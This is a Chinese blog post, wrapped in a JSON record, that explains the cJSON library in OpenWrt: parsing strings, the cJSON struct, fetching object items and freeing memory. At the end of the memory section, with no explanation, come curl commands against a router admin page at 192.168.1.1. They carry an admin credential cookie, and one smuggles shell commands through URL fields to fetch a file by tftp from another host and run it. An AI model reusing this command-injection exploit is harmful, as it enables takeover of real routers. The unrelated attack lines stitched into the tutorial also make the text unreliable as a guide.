{"md5":"1bd513b00f9189ec392314bdfe8ef6eb","content":"\n\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><span class=\"section-number-2\">1</span> 前言</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\ncJSON在openwrt中使用，和前端交互时使用比较多。其基本的使用也很简单，数据结构也很简单。json每个对象都是一个名字\n</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><span class=\"section-number-2\">2</span> 解析</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n</div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\"><span class=\"section-number-3\">2.1</span> 构建JSON数据结构cJSON</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<p>\n有两种方法，一种是parse字符串来得到，即：\n</p>\n<div class=\"org-src-container\">\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">cJSON* root = cJSON_Parse(my_json_string);</span><br></pre></td></tr></table></figure>\n</div>\n<p>\ncJSON的定义是：\n</p>\n<div class=\"org-src-container\">\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> cJSON {</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> cJSON *next,*prev;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> cJSON *child;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> type;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *valuestring;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> valueint; <span class=\"comment\">/* writing to valueint is DEPRECATED, please use cJSON_SetNumberValue instead */</span></span><br><span class=\"line\">    <span class=\"keyword\">double</span> valuedouble;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *<span class=\"built_in\">string</span>;</span><br><span class=\"line\">} cJSON;</span><br></pre></td></tr></table></figure>\n</div>\n<p>\n可以看到cJSON其实是一棵N-tree\n数组的关键没有名称，只能用索引引用。对于cjson中的数组和对象起始数据结构上没有本质区别，只在与索引方式。\n</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\"><span class=\"section-number-3\">2.2</span> 查询数据结构的内容</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n首先，要了解数据结构的内容，cJSON的每一项都是cJSON，没有树叶，所以值要从中获取，但是我们没法知道是否是树叶，所以要手动确认。得到子对象的方法是使用cJSON<sub>GetObjectItem，得到一个新的</sub>\n</p>\n<div class=\"org-src-container\">\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">cJSON_GetObjectItem(format, <span class=\"string\">\"frame rate\"</span>)</span><br></pre></td></tr></table></figure>\n</div>\n<p>\n以功能而言是将指针指向的，双向链表便利一遍。其实一个object指的是一个链表，\n一个节点有三种语义：对象、数字、字符串。它们使用一个字段名来引用\n</p>\n</div>\n</div>\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\"><span class=\"section-number-3\">2.3</span> 析构数据结构</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\nc没有自动内存管理，所以要手动析构，使用函数cJSON<sub>Delete</sub>(root);\n</p>\n\n<p>\nsudo curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true' 'http://192.168.1.1/'\n</p>\n\n<p>\nsudo curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' &#x2013;referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl<sub>enable</sub>=1&amp;parent<sub>mac</sub><sub>addr</sub>=00-00-00-00-00-02&amp;Page=1'\n</p>\n\n<p>\ncurl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' &#x2013;referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&amp;Page=1' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child<sub>mac</sub>=00-00-00-00-00-01&amp;lan<sub>lists</sub>=888&amp;url<sub>comment</sub>=test&amp;url<sub>0</sub>=;cd%20/tmp;&amp;url<sub>1</sub>=;tftp%20-gl%20aa%20192.168.1.100;&amp;url<sub>2</sub>=;sh%20aa;&amp;url<sub>3</sub>=&amp;url<sub>4</sub>=&amp;url<sub>5</sub>=&amp;url<sub>6</sub>=&amp;url<sub>7</sub>=&amp;scheds<sub>lists</sub>=255&amp;enable=1&amp;Changed=1&amp;SelIndex=0&amp;Page=1&amp;rule<sub>mode</sub>=0&amp;Save=%B1%A3+%B4%E6'\n</p>\n</div>\n</div>\n</div>\n\nLast Updated 2017-06-11 日 02:15.<br>Render by <a href=\"https://github.com/CodeFalling/hexo-renderer-org\">hexo-renderer-org</a> with <a href=\"http://www.gnu.org/software/emacs/\">Emacs</a> 25.3.1 (<a href=\"http://orgmode.org\">Org</a> mode 8.2.10)\n"}
